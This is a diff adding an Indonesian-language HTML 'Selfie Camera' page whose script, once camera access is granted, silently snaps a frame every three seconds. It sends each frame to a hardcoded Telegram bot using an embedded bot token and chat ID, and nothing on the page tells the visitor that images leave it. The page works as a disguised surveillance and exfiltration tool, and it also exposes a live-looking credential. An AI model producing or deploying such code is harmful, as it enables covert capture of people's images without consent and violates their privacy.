@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selfie Camera</title>
+    <style>
+        #video-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+        }
+        video, canvas {
+            width: 100%;
+            display: block;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: rgba(0, 0, 0, 0.5); /* semi-transparent background */
+            color: white;
+            font-size: 2em;
+            font-weight: bold;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <h1>Ambil Foto Selfie</h1>
+    <div id="video-container">
+        <video id="video" autoplay></video>
+        <div id="overlay">HAI BANGG</div>
+    </div>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const chatId = '7056220365';
+        const botToken = '7459332258:AAFN3h2GKQ7i0wEWNqOzd39AqJstjqBCsGQ';
+
+        // Minta akses ke kamera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                // Ambil foto setiap 3 detik
+                setInterval(takePhotoAndSend, 3000);
+            })
+            .catch(err => {
+                console.error('Error accessing webcam: ', err);
+            });
+
+        function takePhotoAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'selfie.jpg');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error('Error sending photo to Telegram:', data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
